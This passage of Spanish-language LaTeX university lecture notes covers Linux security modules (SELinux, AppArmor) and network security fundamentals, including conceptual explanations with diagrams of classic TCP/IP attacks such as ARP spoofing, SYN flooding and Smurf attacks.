+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{4.2cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{\emph{Capability}} & \textbf{Qué permite} \\
+\midrule
+\texttt{CAP\_CHOWN} & Cambiar el UID y el GID de los ficheros. \\
+\texttt{CAP\_DAC\_OVERRIDE} & Sobrepasar el DAC, p.\,ej., saltarse las comprobaciones de permisos. \\
+\texttt{CAP\_KILL} & Saltarse las comprobaciones de permisos para enviar señales. \\
+\texttt{CAP\_NET\_ADMIN} & Operaciones de administración de red (configurar interfaces, etc.). \\
+\texttt{CAP\_NET\_RAW} & Usar \emph{raw sockets} (el caso de \texttt{ping}). \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\section{Valoración}
+ 
+Las \emph{capabilities} son:
+\begin{itemize}
+  \item Un mecanismo de seguridad \textbf{efectivo}.
+  \item \textbf{Complicadas}.
+  \item \textbf{No totalmente soportadas} en todos los sistemas.
+  \item Muy interesantes para áreas novedosas, p.\,ej., \textbf{contenedores semiprivilegiados} que se ejecutan como no-root.
+\end{itemize}
+(No se estudian en detalle en la asignatura.)
+ 
+%=====================================================================
+\chapter{Linux Security Modules (LSM)}
+%=====================================================================
+ 
+\section{Diseño}
+ 
+\begin{itemize}
+  \item Diseñados para cubrir las necesidades que permiten implementar con éxito un \textbf{módulo MAC en Linux} sin imponer un parche complejo sobre el kernel principal (\emph{mainstream}).
+  \item \textbf{Enfoque}: insertar \textbf{\emph{hooks}} (llamadas ascendentes al módulo) en cada punto del kernel en el que una llamada al sistema de usuario está a punto de acceder a un objeto interno importante del kernel.
+\end{itemize}
+ 
+\section{Características}
+ 
+\begin{itemize}
+  \item Un LSM es análogo a un LKM (\emph{Loadable Kernel Module}), pero \textbf{puede denegar} a un proceso el acceso a objetos importantes del kernel: ficheros, inodos, estructuras de tareas, credenciales y objetos de IPC (\emph{Inter-Process Communication}, comunicación entre procesos). A diferencia de un LKM, un LSM \textbf{se compila dentro del kernel}: no se carga en caliente.
+  \item El framework LSM actual permite compilar \textbf{varios LSM} en el kernel, que pueden \textbf{apilarse} (\emph{stacked}) y usarse simultáneamente.
+  \item Hay \textbf{8 LSM en el kernel 5.4}, y no todos son para MAC.
+\end{itemize}
+ 
+\subsection*{Flujo de una llamada al sistema con LSM (p.\,ej., \texttt{open()})}
+ 
+\begin{center}
+\begin{tikzpicture}[node distance=0.55cm]
+  \node[cajagris, minimum width=5.2cm] (p) {Proceso de usuario: \texttt{open()}};
+  \node[caja, below=1.1cm of p, minimum width=5.2cm] (d) {Despacho de la llamada /\\búsqueda del fichero};
+  \node[caja, below=of d, minimum width=5.2cm] (dac) {Comprobación de permisos\\(\textbf{DAC} clásico)};
+  \node[caja, below=of dac, minimum width=5.2cm, fill=uc3m!12] (h) {\textbf{Hooks LSM}\\{\footnotesize SELinux $\to$ LoadPin $\to$ Yama}};
+  \node[caja, below=of h, minimum width=5.2cm] (a) {Acceso al fichero};
+  \draw[dashed, gray] ($(p.south)+(-4.2,-0.55)$) -- ($(p.south)+(6.8,-0.55)$);
+  \node[font=\scriptsize, gray, anchor=south east] at ($(p.south)+(6.8,-0.55)$) {espacio de usuario};
+  \node[font=\scriptsize, gray, anchor=north east] at ($(p.south)+(6.8,-0.55)$) {espacio de kernel};
+  \draw[flecha] (p) -- (d);
+  \draw[flecha] (d) -- (dac);
+  \draw[flecha] (dac) -- node[etiq, right=2pt] {OK} (h);
+  \draw[flecha] (h) -- node[etiq, right=2pt] {OK} (a);
+  \draw[flecha, uc3m] (a.east) -- ++(1.2,0) |- (p.east);
+  \node[etiq, text=uc3m, right=2pt] at ($(a.east)+(1.2,1.9)$) {éxito};
+  \draw[thick, red!60!black] (dac.west) -- ++(-1.2,0) coordinate (e1);
+  \draw[flecha, red!60!black] (h.west) -- ++(-1.2,0) -- (e1) |- (p.west);
+  \node[etiq, text=red!60!black, left=2pt] at ($(dac.west)+(-1.2,-0.7)$) {error\\(acceso\\denegado)};
+\end{tikzpicture}
+\end{center}
+ 
+\begin{enumerate}
+  \item Un proceso de espacio de usuario hace la llamada al sistema.
+  \item En espacio de kernel se despacha la llamada y se busca el fichero (\emph{Dispatch System Call / Lookup File}).
+  \item Se comprueban los permisos del fichero (\emph{Check File Permissions}): el \textbf{DAC} clásico.
+  \item Se invocan los \textbf{\emph{hooks} LSM} de apertura de fichero, que pasan por las comprobaciones de política de los LSM activos (en el ejemplo, SELinux, LoadPin y Yama).
+  \item Si \textbf{todas} pasan, se manipula el fichero y el control vuelve al proceso. Si \textbf{alguna} deniega, el camino de error devuelve el rechazo al proceso.
+\end{enumerate}
+ 
+\begin{importante}
+Los LSM se consultan \textbf{después} del DAC: \textbf{solo pueden restringir más}, nunca conceder un acceso que el DAC ya ha denegado.
+\end{importante}
+ 
+\section{LSM principales \emph{legacy}}
+ 
+\begin{itemize}
+  \item \textbf{SELinux}, \textbf{TOMOYO}, \textbf{AppArmor} y \textbf{SMACK}.
+  \item Todos son \textbf{MAC con políticas configurables}.
+  \item Solo se podía usar \textbf{un LSM principal a la vez}.
+\end{itemize}
+ 
+\section{SELinux: \emph{Security-Enhanced Linux}}
+ 
+\begin{itemize}
+  \item Desarrollado por la \textbf{NSA} (\emph{National Security Agency}, la agencia de inteligencia de EE.\,UU.) en 2000.
+  \item Es la implementación MAC por defecto en las distribuciones \textbf{Red Hat}.
+  \item \textbf{Potente y complejo}.
+  \item \textbf{Basado en atributos}: los identificadores de seguridad de los ficheros se guardan en \textbf{atributos extendidos}.
+\end{itemize}
+ 
+\begin{ejemplo}{Etiqueta SELinux de \texttt{/bin/bash}}
+\begin{verbatim}
+$ ls -Z /bin/bash
+-rwxr-xr-x. root root system_u:object_r:shell_exec_t:s0 /bin/bash
+\end{verbatim}
+El \textbf{contexto} tiene la forma \texttt{usuario:rol:tipo:nivel}: \texttt{system\_u} es el usuario SELinux (sufijo \texttt{\_u}), \texttt{object\_r} el rol (\texttt{\_r}), \texttt{shell\_exec\_t} el \textbf{tipo} (\texttt{\_t}) y \texttt{s0} el nivel de sensibilidad. El punto tras los permisos indica que el fichero tiene contexto SELinux.
+\end{ejemplo}
+ 
+\begin{itemize}
+  \item \textbf{Especificación de la política}: define qué acciones pueden realizar los sujetos sobre los objetos etiquetados con un tipo determinado. En el ejemplo:
+    \begin{itemize}
+      \item Los permisos \textbf{DAC} permiten a todos los usuarios ejecutar \texttt{bash}.
+      \item Con \textbf{SELinux}, un administrador de seguridad puede especificar además \textbf{qué sujetos pueden ejecutar ficheros de tipo \texttt{shell\_exec\_t}} en un fichero de política. Por ejemplo, que un \textbf{servidor web no pueda ejecutar una shell}, por si es vulnerable a un ataque de ejecución remota de código.
+    \end{itemize}
+\end{itemize}
+ 
+\section{AppArmor y SMACK}
+ 
+\begin{itemize}
+  \item \textbf{SMACK}: \emph{Simplified Mandatory Access Control Kernel}.
+  \item \textbf{AppArmor} (\emph{Application Armor}):
+    \begin{itemize}
+      \item Introducido en Immunix Linux (1998), después en SUSE. También está en \textbf{Ubuntu}.
+    \end{itemize}
+  \item \textbf{Ambos}:
+    \begin{itemize}
+      \item Son MAC basados en \textbf{rutas de fichero} (\emph{paths}) en lugar de etiquetas, por lo que son \textbf{agnósticos del sistema de ficheros}: no necesitan uno que soporte etiquetas.
+      \item Son \textbf{menos complejos} y más fáciles de administrar para el usuario medio que SELinux.
+      \item Están presentes en dispositivos \textbf{empotrados / IoT} (\emph{Internet of Things}).
+    \end{itemize}
+\end{itemize}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{3.2cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+ & \textbf{SELinux} & \textbf{AppArmor / SMACK} \\
+\midrule
+\textbf{Identifica objetos por} & Etiquetas (atributos extendidos) & Rutas de fichero \\
+\textbf{Sistema de ficheros} & Debe soportar etiquetas & Agnóstico \\
+\textbf{Complejidad} & Alta (potente) & Menor, más fácil de administrar \\
+\textbf{Dónde se usa} & Red Hat y derivadas & SUSE, Ubuntu, empotrados / IoT \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+
+\part{Seguridad en redes}
+ 
+%=====================================================================
+\chapter{Fundamentos de seguridad en redes}
+%=====================================================================
+ 
+\begin{importante}[title={Sobre este tema}]
+Asignatura \textbf{Security Engineering / Ingeniería de Ciberseguridad} (UC3M). Transparencias \emph{Network security} de \textbf{Juan Tapiador}, con licencia CC BY.
+\begin{enumerate}
+  \item Fundamentos de seguridad en redes.
+  \item Seguridad TCP/IP.
+  \item Descubrimiento y escaneo de redes.
+  \item Seguridad web.
+\end{enumerate}
+Las notas tomadas en clase sobre las transparencias van marcadas como \emph{Nota de clase}. Al final hay un glosario con todas las siglas del tema.
+\end{importante}
+ 
+\section{Amenazas a las comunicaciones en red}
+ 
+\begin{itemize}
+  \item \textbf{Interceptación} (\emph{interception}), también llamada \emph{eavesdropping} o \emph{wiretapping} (escucha, pinchazo).
+  \item \textbf{Modificación} (\emph{modification}).
+  \item \textbf{Fabricación} (\emph{fabrication}).
+  \item \textbf{Interrupción} (\emph{interruption}), también llamada denegación de servicio (\emph{denial of service}, DoS).
+\end{itemize}
+ 
+\textbf{Algunas de ellas pueden contrarrestarse con protocolos seguros.}
+ 
+\section{Interceptación}
+ 
+\begin{importante}[title={Idea clave}]
+El \textbf{canal es accesible para el adversario}.
+\end{importante}
+ 
+\begin{itemize}
+  \item Los datos pueden accederse en el \textbf{medio de transmisión} o en el \textbf{equipamiento de red}.
+  \item Los usuarios tienen \textbf{poco control sobre el encaminamiento} de la información enviada, que puede pasar por equipos hostiles.
+    \begin{itemize}
+      \item La \textbf{infraestructura de encaminamiento} es especialmente vulnerable.
+    \end{itemize}
+\end{itemize}
+ 
+\section{Modificación y fabricación}
+ 
+\begin{itemize}
+  \item Los datos pueden ser:
+    \begin{itemize}
+      \item \textbf{modificados} por el camino (\emph{en route});
+      \item \textbf{creados e insertados};
+      \item \textbf{repetidos} a partir de una comunicación interceptada previamente (ataque de repetición o \emph{replay}).
+    \end{itemize}
+  \item Puede provocar corrupción de datos, \textbf{elusión de la autenticación} o muchas otras situaciones potencialmente dañinas.
+\end{itemize}
+ 
+\section{Interrupción}
+ 
+\begin{itemize}
+  \item Se consigue mediante:
+    \begin{itemize}
+      \item \textbf{Mal uso del encaminamiento} (\emph{routing misuse}).
+      \item \textbf{Demanda excesiva} (p.\,ej., inundación de tráfico o \emph{traffic flooding}).
+      \item \textbf{Fallo de componentes}.
+    \end{itemize}
+  \item Causa interrupción del servicio, con consecuencias potencialmente fatales.
+  \item Es un \textbf{problema perenne} en Internet.
+\end{itemize}
+ 
+\noindent\emph{Nota de clase:} una solución es limitar el ancho de banda por usuario.
+ 
+%=====================================================================
+\chapter{Seguridad TCP/IP}
+%=====================================================================
+ 
+\begin{itemize}
+  \item La pila de protocolos TCP/IP \textbf{carece incluso de los mecanismos de seguridad más básicos}, tanto en su diseño como en su implementación.
+  \item Muchas vulnerabilidades y ataques se identificaron muy pronto en la historia de Internet:
+    \begin{itemize}
+      \item \textbf{Algunos corregibles}, y corregidos en cierta medida.
+      \item \textbf{Algunos no corregibles}. \emph{Nota de clase:} la transición es difícil.
+    \end{itemize}
+  \item Es esencial conocerlos para entender por qué hacen falta las tecnologías actuales de seguridad en redes.
+\end{itemize}
+ 
+\begin{ejemplo}{Nota de clase: la pila de protocolos de extremo a extremo}
+\begin{center}
+\begin{tikzpicture}[
+  capa/.style={draw=uc3m, fill=uc3m!5, minimum width=2.1cm, minimum height=0.48cm, font=\footnotesize, inner sep=1pt},
+  enl/.style={thick, magenta!70!black}]
+  % Equipos
+  \node[cajagris, minimum width=1.9cm] (h1) at (0,0) {Usuario};
+  \node[caja, minimum width=1.6cm, rounded corners=8pt] (r1) at (3.3,0) {Router};
+  \node[cajagris, minimum width=1.4cm, rounded corners=8pt] (in) at (6.2,0) {Internet};
+  \node[caja, minimum width=1.6cm, rounded corners=8pt] (r2) at (9.1,0) {Router};
+  \node[cajagris, minimum width=1.9cm] (h2) at (12.2,0) {Servidor};
+  \draw[enl] (h1) -- (r1) -- (in) -- (r2) -- (h2);
+  % Pilas
+  \foreach \x/\n in {0/5, 12.2/5} {
+    \foreach \c [count=\i] in {aplicación, transporte, red, enlace, físico}
+      \node[capa] at (\x,-0.6-0.48*\i) {\c};
+  }
+  \foreach \x in {3.3, 9.1} {
+    \foreach \c [count=\i] in {red, enlace, físico}
+      \node[capa] at (\x,-0.6-0.48*\i-0.96) {\c};
+  }
+\end{tikzpicture}
+\end{center}
+Los routers solo implementan hasta la capa de red: reenvían paquetes sin mirar las capas superiores.
+\begin{itemize}
+  \item El DNS (\emph{Domain Name System}) puede ser suplantado. La solución es DNSSEC (\emph{DNS Security Extensions}), y otra solución sería firmar.
+  \item Implantar estas soluciones es difícil, como pasa con la transición de IPv4 a IPv6.
+\end{itemize}
+\end{ejemplo}
+ 
+\section{Internet Protocol (IP)}
+ 
+\begin{center}
+\begin{tikzpicture}[x=0.36cm, y=0.62cm,
+  campo/.style={draw=uc3m, fill=uc3m!5, font=\scriptsize, align=center, inner sep=0pt}]
+  \node[font=\scriptsize] at (16,1.0) {32 bits};
+  \draw[{Stealth[length=1.5mm]}-{Stealth[length=1.5mm]}] (0,0.6) -- (32,0.6);
+  \foreach \b in {0,4,8,16,19,31} \node[font=\tiny, gray] at (\b+0.5,0.2) {\b};
+  % fila, inicio, fin, texto
+  \foreach \r/\a/\b/\t in {
+    1/0/4/Versión, 1/4/8/IHL, 1/8/16/Tipo de servicio, 1/16/32/Longitud total,
+    2/0/16/Identificación, 2/16/19/{\tiny D\,M\\[-2pt]\tiny F\,F}, 2/19/32/Desplazamiento de fragmento,
+    3/0/8/TTL, 3/8/16/Protocolo, 3/16/32/Suma de comprobación de cabecera,
+    4/0/32/Dirección de origen,
+    5/0/32/Dirección de destino} {
+    \draw[campo] (\a,-\r+1) rectangle (\b,-\r);
+    \node[font=\scriptsize, align=center] at ({(\a+\b)/2},-\r+0.5) {\t};
+  }
+  \draw[campo, fill=gray!8] (0,-5) rectangle (32,-6.4);
+  \node[font=\scriptsize] at (16,-5.7) {Opciones (0 o más palabras)};
+\end{tikzpicture}
+\end{center}
+ 
+\begin{itemize}
+  \item \textbf{IPv4}. \emph{Nota de clase:} IPv4 no es seguro; IPv6 sí incorpora seguridad.
+  \item \textbf{Ninguno de los campos va cifrado y no hay autenticación.}
+  \item \textbf{Sin conexión} (\emph{connectionless}): no se mantiene estado entre dos datagramas.
+\end{itemize}
+ 
+\section{Transmission Control Protocol (TCP)}
+ 
+\noindent\emph{Nota de clase:} frente a UDP, TCP añade más latencia, pero es más seguro.
+ 
+\begin{center}
+\begin{tikzpicture}[x=0.36cm, y=0.62cm,
+  campo/.style={draw=uc3m, fill=uc3m!5}]
+  \node[font=\scriptsize] at (16,1.0) {32 bits};
+  \draw[{Stealth[length=1.5mm]}-{Stealth[length=1.5mm]}] (0,0.6) -- (32,0.6);
+  \foreach \r/\a/\b/\t in {
+    1/0/16/Puerto de origen, 1/16/32/Puerto de destino,
+    2/0/32/Número de secuencia,
+    3/0/32/Número de acuse de recibo (\emph{acknowledgement}),
+    4/0/4/Hlen, 4/4/10/Reservado, 4/16/32/Ventana,
+    5/0/16/Suma de comprobación, 5/16/32/Puntero urgente} {
+    \draw[campo] (\a,-\r+1) rectangle (\b,-\r);
+    \node[font=\scriptsize, align=center] at ({(\a+\b)/2},-\r+0.5) {\t};
+  }
+  \foreach \f [count=\i from 0] in {U,A,P,R,S,F} {
+    \draw[campo, fill=red!8, draw=red!60!black] (10+\i,-3) rectangle (11+\i,-4);
+    \node[font=\tiny\bfseries] at (10.5+\i,-3.5) {\f};
+  }
+  \draw[campo, fill=gray!8] (0,-5) rectangle (32,-6);
+  \node[font=\scriptsize] at (16,-5.5) {[ Opciones ]};
+\end{tikzpicture}
+\end{center}
+{\small Los \emph{flags} (en rojo) son URG, ACK, PSH, RST, SYN y FIN. Hlen es la longitud de la cabecera.}
+ 
+\begin{itemize}
+  \item Establecimiento y liberación de la conexión: \textbf{\emph{3-way handshakes}} (acuerdos en tres pasos).
+  \item \textbf{Máquina de estados} para cada conexión, \textbf{mal especificada}.
+  \item \textbf{Sin cifrado y sin autenticación.}
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[cajagris, minimum width=2cm] (c) at (0,0) {Cliente};
+  \node[cajagris, minimum width=2cm] (s) at (7,0) {Servidor};
+  \draw[gray, dashed] (0,-0.5) -- (0,-3.4);
+  \draw[gray, dashed] (7,-0.5) -- (7,-3.4);
+  \draw[flecha] (0,-1.0) -- node[etiq, above] {1. \texttt{SYN} (seq\,=\,$x$)} (7,-1.5);
+  \draw[flecha] (7,-1.9) -- node[etiq, above] {2. \texttt{SYN+ACK} (seq\,=\,$y$, ack\,=\,$x+1$)} (0,-2.4);
+  \draw[flecha] (0,-2.8) -- node[etiq, above] {3. \texttt{ACK} (ack\,=\,$y+1$)} (7,-3.3);
+\end{tikzpicture}
+\end{center}
+{\small Ilustración añadida: el \emph{3-way handshake} con el que se abre una conexión TCP.}
+ 
+\subsection{Problemas de la máquina de estados de TCP}
+ 
+\begin{itemize}
+  \item \textbf{Temporizadores} (\emph{timers}):
+    \begin{itemize}
+      \item \textbf{Algunos especificados, otros dejados abiertos a la implementación.}
+      \item No existen para todos los estados.
+    \end{itemize}
+  \item \textbf{No especifica algunas transiciones} (p.\,ej., con los \emph{flags} SYN y FIN activados a la vez).
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[
+  st/.style={draw=uc3m, fill=uc3m!5, circle, minimum size=1.25cm, font=\tiny\bfseries, align=center, inner sep=0pt},
+  tr/.style={-{Stealth[length=1.6mm]}, thin},
+  lb/.style={font=\tiny, fill=white, inner sep=1pt}]
+  \node[st] (closed) at (4.5,10) {CLOSED};
+  \node[st] (listen) at (4.5,8.2) {LISTEN};
+  \node[st] (srcvd) at (1,6.4) {SYN\\RCVD};
+  \node[st] (ssent) at (8,6.4) {SYN\\SENT};
+  \node[st] (est) at (4.5,4.6) {ESTAB-\\LISHED};
+  \node[st] (cwait) at (8,4.6) {CLOSE\\WAIT};
+  \node[st] (fw1) at (1,2.8) {FIN\\WAIT-1};
+  \node[st] (closing) at (4.5,2.8) {CLOSING};
+  \node[st] (lack) at (8,2.8) {LAST\\ACK};
+  \node[st] (fw2) at (1,0.6) {FIN\\WAIT-2};
+  \node[st] (tw) at (4.5,0.6) {TIME\\WAIT};
+  \draw[tr] (closed) to[bend right=20] node[lb, left] {passive open} (listen);
+  \draw[tr] (listen) to[bend right=20] node[lb, right] {close} (closed);
+  \draw[tr] (closed) -- node[lb, sloped, above] {active open / syn} (ssent);
+  \draw[tr] (listen) -- node[lb, sloped, above] {syn / syn+ack} (srcvd);
+  \draw[tr] (listen) -- node[lb, sloped, above] {send / syn} (ssent);
+  \draw[tr] (srcvd) to[bend right=28] node[lb, sloped, below] {reset} (listen);
+  \draw[tr] (ssent) -- node[lb] {syn / syn+ack} (srcvd);
+  \draw[tr] (srcvd) -- node[lb, sloped, below] {ack} (est);
+  \draw[tr] (ssent) -- node[lb, sloped, below] {syn+ack / ack} (est);
+  \draw[tr] (ssent.east) -- ++(0.6,0) |- node[lb, pos=0.25, right] {close / timeout / reset} (closed.east);
+  \draw[tr] (est) -- node[lb] {fin / ack} (cwait);
+  \draw[tr] (est) -- node[lb, sloped, above] {close / fin} (fw1);
+  \draw[tr] (srcvd) -- node[lb, left] {close / fin} (fw1);
+  \draw[tr] (cwait) -- node[lb, right] {close / fin} (lack);
+  \draw[tr] (lack.east) -- ++(1.3,0) |- node[lb, pos=0.1, right] {ack /} ($(closed.east)+(0,0.3)$);
+  \draw[tr] (fw1) -- node[lb, above] {fin / ack} (closing);
+  \draw[tr] (fw1) -- node[lb, left] {ack /} (fw2);
+  \draw[tr] (fw1) -- node[lb, sloped, above] {fin-ack / ack} (tw);
+  \draw[tr] (closing) -- node[lb, right] {ack /} (tw);
+  \draw[tr] (fw2) -- node[lb, below] {fin / ack} (tw);
+  \draw[tr] (tw.east) -- ++(4.6,0) node[lb, pos=0.55, below] {timeout tras 2 MSL} |- ($(closed.east)+(0,-0.3)$);
+  \draw[red!60!black, dashed, thick, rotate around={0:(2.75,1.7)}] (2.75,1.7) ellipse (2.95cm and 1.85cm);
+\end{tikzpicture}
+\end{center}
+{\small Máquina de estados de TCP. La notación es \emph{evento / acción}. En clase se rodeó la zona de cierre de la conexión (en rojo).}
+ 
+\section{Repaso de ataques clásicos}
+ 
+\begin{enumerate}
+  \item Interceptación de contraseñas.
+  \item ARP \emph{spoofing}.
+  \item SYN \emph{flooding}.
+  \item IP \emph{spoofing}.
+  \item Ataque Smurf.
+  \item Ataques de encaminamiento: IP \emph{source routing}.
+  \item Ataques de encaminamiento: ataques a RIP.
+  \item Ataques ICMP.
+  \item Ataques de amplificación UDP.
+\end{enumerate}
+ 
+\subsection{1. Interceptación de contraseñas}
+ 
+\begin{itemize}
+  \item Los protocolos que no implementan un \textbf{canal seguro} están expuestos a interceptación.
+  \item Ejemplo clásico: \textbf{Telnet} (de \emph{teletype network}). La transparencia muestra una captura de tráfico en la que el usuario y la contraseña se ven \textbf{en claro, sin cifrar}.
+\end{itemize}
+ 
+\begin{ejemplo}{Nota de clase: ¿por qué hay protocolos que no implementan medidas de seguridad (p.\,ej., cifrado)?}
+\begin{itemize}
+  \item \textbf{Dispositivos IoT}: no tienen ``capacidad''.
+  \item \textbf{Sistemas heredados} (\emph{legacy}): por ejemplo, un túnel en República Dominicana gestionado por Indra.
+\end{itemize}
+\end{ejemplo}
+ 
+\subsection{2. ARP \emph{spoofing}}
+ 
+\begin{itemize}
+  \item ARP: \emph{Address Resolution Protocol}, que traduce direcciones IP a direcciones MAC dentro de una red local. \emph{Nota de clase:} no tiene seguridad, porque está pensado para que sea rápido (rendimiento). Para comunicarme con otra red necesito usar el router.
+  \item \textbf{Ataque de LAN}.
+  \item \textbf{Objetivo}: \textbf{conseguir que la dirección MAC del atacante quede asociada a la IP de otro equipo}, de modo que el tráfico enviado a la víctima se envíe al atacante.
+    \begin{itemize}
+      \item El atacante puede entonces inspeccionar, modificar, redirigir o bloquear el tráfico.
+    \end{itemize}
+  \item \textbf{Fácil de conseguir}: \textbf{al atacante le basta con enviar una respuesta ARP falsificada}.
+  \item \textbf{Vulnerabilidad}: \textbf{¡ARP no tiene estado!} Los equipos guardan en caché cualquier respuesta ARP que reciben, porque no tienen memoria para saber si la habían pedido o no.
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[cajagris, minimum width=2.4cm] (v) at (0,0) {Víctima};
+  \node[caja, minimum width=2.4cm, rounded corners=8pt] (r) at (9,0) {Router\\{\scriptsize IP 10.0.0.1}};
+  \node[caja, minimum width=2.4cm, fill=red!8, draw=red!60!black] (a) at (4.5,-2.4) {Atacante\\{\scriptsize MAC \texttt{aa:aa}}};
+  \draw[flecha, red!60!black] (a) -- node[etiq, right=8pt, align=left, text=red!60!black, font=\scriptsize] {respuesta ARP falsa:\\``10.0.0.1 está en \texttt{aa:aa}''} (v);
+  \draw[flecha, dashed, gray] (v) -- node[etiq, above] {tráfico que debería ir directo al router} (r);
+  \draw[flecha, red!60!black, thick] (v.south) |- ($(a.west)+(0,0.15)$);
+  \draw[flecha, red!60!black, thick] ($(a.east)+(0,0.15)$) -| (r.south);
+\end{tikzpicture}
+\end{center}
+{\small Ilustración añadida: tras la respuesta ARP falsa, la víctima envía al atacante el tráfico dirigido al router (\emph{man-in-the-middle}).}
+ 
+\subsection{3. Ataque TCP SYN}
+ 
+\begin{itemize}
+  \item \textbf{SYN \emph{flooding}}.
+  \item Fallo en la forma en que la mayoría de los equipos implementan el \emph{3-way handshake}:
+    \begin{itemize}
+      \item El receptor debe llevar la cuenta de las \textbf{conexiones parcialmente abiertas} durante al menos \textbf{75\,s}.
+      \item \textbf{La cola se llena y el equipo deja de aceptar conexiones nuevas.}
+    \end{itemize}
+  \item El resultado es una \textbf{DoS}.
+\end{itemize}
+ 
+\subsection{4. IP \emph{spoofing}}
+ 
+\noindent\emph{Nota de clase:} en IPv4 la cabecera se puede modificar libremente; en IPv6 no tanto (más cabeceras).
+ 
+\begin{itemize}
+  \item \textbf{El atacante finge enviar datos desde una dirección IP distinta de la suya.}
+  \item Hay \textbf{dos pegas}:
+    \begin{itemize}
+      \item \textbf{El equipo responderá a la IP falsificada, así que el atacante puede no ver la respuesta}, salvo que pueda escuchar la red entre ambos equipos (atacante \emph{on-path} frente a \emph{off-path}).
+      \item Si el atacante quiere establecer una conexión TCP, necesita \textbf{averiguar el número de secuencia del otro equipo}.
+    \end{itemize}
+\end{itemize}
+ 
+\subsection{5. Ataque Smurf}
+ 
+\noindent\emph{Nota de clase:} es un ataque de inundación que provoca una DoS.
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[caja, fill=red!8, draw=red!60!black, minimum width=2.0cm] (a) at (-1.4,0) {Atacante};
+  \node[caja, minimum width=3.0cm, rounded corners=8pt] (b) at (4.6,0) {Dirección de\\\emph{broadcast} de la red};
+  \foreach \i/\y in {1/1.3,2/0.45,3/-0.45,4/-1.3} \node[cajagris, minimum width=1.3cm, minimum height=0.55cm, font=\scriptsize] (h\i) at (8.4,\y) {Equipo \i};
+  \node[caja, minimum width=2.0cm] (v) at (12.2,0) {Víctima};
+  \draw[flecha] (a) -- node[etiq, above] {ECHO request} node[etiq, below, font=\scriptsize] {origen\,=\,víctima} (b);
+  \foreach \i in {1,2,3,4} { \draw[flecha, gray] (b.east) -- (h\i.west); \draw[flecha, red!60!black] (h\i.east) -- (v.west); }
+  \node[font=\scriptsize, text=red!60!black, align=center] at (12.2,-1.4) {saturada de\\ECHO replies};
+\end{tikzpicture}
+\end{center}
+ 
+\begin{enumerate}
+  \item El atacante envía una petición ICMP \emph{ECHO} a la dirección de \emph{broadcast} de la red, con la \textbf{dirección de la víctima como origen}.
+  \item Todos los equipos de la red responden a la víctima.
+  \item La víctima queda \textbf{saturada} con las respuestas \emph{ECHO} de toda la red.
+\end{enumerate}
+ 
+\subsection{6. Ataques de encaminamiento: IP \emph{source routing}}
+ 
+\noindent\emph{Nota de clase:} tiene que ver con las tablas de encaminamiento; \emph{source routing} es el encaminamiento dirigido por el origen.
+ 
+\begin{itemize}
+  \item El \emph{source routing} permite al equipo de origen \textbf{especificar el camino} (ruta) que el receptor debe usar para responderle.
+  \item Es una opción de IP \textbf{poco usada y muy peligrosa}:
+    \begin{itemize}
+      \item El atacante puede especificar una ruta que dirija el tráfico por un camino que pueda monitorizar.
+    \end{itemize}
+  \item La mayoría de los routers están configurados para \textbf{descartar} los paquetes con \emph{source routing}.
+\end{itemize}
+ 
+\noindent\emph{Nota de clase:} es ineficiente y predecible. Ya no se usa: la opción \emph{IP source routing} se desactiva (\emph{flag} a 0).
+ 
+\subsection{7. Ataques de encaminamiento: ataques a RIP}
+ 
+\begin{itemize}
+  \item RIP: \emph{Routing Information Protocol}.
+    \begin{itemize}
+      \item Se usa para \textbf{propagar información de encaminamiento en redes locales}.
+      \item \textbf{No tiene autenticación incorporada.}
+      \item La información a menudo se usa \textbf{sin verificarla}.
+    \end{itemize}
+  \item El atacante puede enviar información de encaminamiento falsa a un equipo objetivo y a todas las pasarelas del camino para \textbf{suplantar} a un equipo concreto.
+    \begin{itemize}
+      \item Así, todos los paquetes destinados a ese equipo se envían a la máquina del atacante.
+      \item El atacante puede inspeccionar o modificar el tráfico, e incluso reencaminarlo al equipo legítimo mediante \emph{source routing}.
+    \end{itemize}
+\end{itemize}
+ 
+\subsection{8. Ataques ICMP}
+ 
+\noindent\emph{Nota de clase:} este apartado se saltó en clase; se ve en el laboratorio.
+ 
+\begin{itemize}
+  \item Mensaje \textbf{ICMP \emph{redirect}}:
+    \begin{itemize}
+      \item Lo usan las pasarelas para avisar a los equipos de rutas mejores.
+      \item Puede abusarse igual que RIP, aunque ligado a una conexión ya existente.
+    \end{itemize}
+  \item \textbf{ICMP para ataques DoS}:
+    \begin{itemize}
+      \item Mensajes \emph{Destination Unreachable} y \emph{Time-to-Live Exceeded}: ambos pueden usarse para \textbf{cortar conexiones existentes}.
+      \item Mensaje \emph{Subnet Mask Reply}:
+        \begin{itemize}
+          \item Algunos equipos lo aceptaban aunque no hubieran enviado ninguna consulta.
+          \item Uno falso bloquearía todas las comunicaciones con el objetivo.
+        \end{itemize}
+    \end{itemize}
+\end{itemize}
+ 
+\subsection{9. Ataques de amplificación UDP}
+ 
+\begin{itemize}
+  \item Son ataques de \textbf{denegación de servicio distribuida y reflejada} (DRDoS, \emph{Distributed Reflective Denial of Service}):
+    \begin{itemize}
+      \item Una forma de ataque DDoS (\emph{Distributed Denial of Service}).
+      \item Se apoyan en \textbf{servidores y servicios UDP accesibles públicamente} que tienen un \textbf{factor de amplificación del ancho de banda} (BAF, \emph{Bandwidth Amplification Factor}).
+      \item El resultado es \textbf{saturar el sistema de la víctima} con tráfico UDP.
+    \end{itemize}
+  \item El atacante envía al servidor un paquete UDP con la \textbf{IP de origen falsificada} con la de la víctima.
+    \begin{itemize}
+      \item El servidor responde a la víctima.
